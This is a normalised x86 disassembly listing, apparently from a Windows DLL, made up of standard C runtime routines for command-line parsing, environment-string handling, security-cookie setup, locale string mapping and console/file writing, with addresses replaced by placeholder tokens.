mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_1001a96b
pop ecx
test eax eax
je r-xdata
call sub_1001a96b
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_100170a3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1000e021
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_10016f09
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_100119e5
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_10016f09
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1001715e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_100119e5
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_100119e5
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_1000ac80
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_1000bf59
pop ecx
mov [ ebp - 0x4 ] ebx
sub_10017295
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_100172bb
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_100172e1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_1001737f
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_1001a4e9
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000ac69
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_1001a532
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_1000bf59
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_1000bf59
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_1001460a
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_1000c036
pop ecx
cmp eax ebx
je r-xdata
call sub_1001a250
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_1000b660
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_1001a532
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_1000c036
pop ecx
cmp eax ebx
je r-xdata
call sub_1001a250
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_1001460a
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_1001460a
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_1000c036
pop ecx
cmp eax ebx
je r-xdata
call sub_1001a250
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_10017724
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1001737f
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10017769
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_100177c0
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_1000afe5
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_1001a983
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_1001784a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100177c0
add esp 0xc
leave
retn
push [ rw-data ]
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push rw-data
call sub_1001a983
add esp 0x1c
sub_100178c0
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_1001aa47
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1000e8db
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_1000e901
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_10017945
push 0x14
push r--data
call sub_10011ecc
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1000e8ee
and [ eax ] 0x0
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8ee
mov [ eax ] edi
call sub_1000e8db
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000e873
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10011f11
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_1001aabe
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000e8ee
mov [ eax ] edi
call sub_1000e8db
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000e873
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8ee
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100178c0
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017a54
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_10017a5e
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_1001ac50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_1000e8ee
mov [ eax ] esi
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_1000e8ee
xor esi esi
mov [ eax ] esi
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100182b6
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_100178c0
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_1000e343
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_1000e8db
mov [ eax ] 0x1c
call sub_1000e8ee
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_1000e901
pop ecx
jmp r-xdata
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8ee
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_10018544
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_1001ab85
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_10018e92
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
